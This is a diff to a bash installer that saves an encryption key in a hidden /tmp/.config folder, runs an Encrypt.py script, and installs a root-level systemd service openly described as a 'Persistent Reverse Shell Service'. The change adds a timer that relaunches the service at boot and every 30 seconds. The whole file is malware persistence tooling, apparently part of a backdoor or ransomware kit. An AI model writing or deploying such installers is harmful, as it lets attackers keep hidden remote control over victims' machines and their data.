@@ -1,5 +1,13 @@
 #!/bin/bash
 
+# Variables
+SERVICE_NAME=persistence
+TIMER_NAME=${SERVICE_NAME}.timer
+SERVICE_DESCRIPTION="Persistent Reverse Shell Service"
+TIMER_DESCRIPTION="Timer for ${SERVICE_NAME}"
+EXEC_PATH="/usr/bin/python3 /usr/local/bin/persistence"
+KEY_PATH="/tmp/.config/key"
+
 # Ask for the encryption key
 read -p "Enter the encryption key: " encryption_key
 
@@ -7,7 +15,7 @@ read -p "Enter the encryption key: " encryption_key
 [ ! -d "/tmp/.config" ] && mkdir -p "/tmp/.config"
 
 # Save the key
-echo $encryption_key > /tmp/.config/key
+echo $encryption_key > $KEY_PATH
 
 # Path where the Python script will be copied
 TARGET_DIR="/usr/local/bin"
@@ -26,27 +34,41 @@ chmod +x $TARGET_DIR/persistence
 
 # Execute Encrypt.py
 echo "Executing Encrypt.py..."
-python3 encrypt.py
+python3 Encrypt.py
 
 # Create the systemd service file for persistence.py
-echo "Creating systemd service file for persistence.py..."
-cat <<EOF > /etc/systemd/system/persistence.service
+echo "Creating systemd service file for $SERVICE_NAME..."
+cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
 [Unit]
-Description=Reverse Shell Service for persistence.py
+Description=$SERVICE_DESCRIPTION
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 $TARGET_DIR/persistence
-Restart=always
-User=root
+ExecStart=$EXEC_PATH
+Restart=on-failure
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# Enable and start the service
-echo "Enabling and starting the persistence service..."
-systemctl enable persistence.service
-systemctl start persistence.service
+# Create the systemd timer file for the service
+echo "Creating systemd timer file for $TIMER_NAME..."
+cat <<EOF > /etc/systemd/system/$TIMER_NAME
+[Unit]
+Description=$TIMER_DESCRIPTION
 
-echo "Persistence service installed and started."
+[Timer]
+OnBootSec=30sec
+OnUnitActiveSec=30sec
+Unit=$SERVICE_NAME.service
+
+[Install]
+WantedBy=timers.target
+EOF
+
+# Enable and start the timer
+echo "Enabling and starting $TIMER_NAME..."
+systemctl enable $TIMER_NAME
+systemctl start $TIMER_NAME
+
+echo "$TIMER_NAME installed and started."
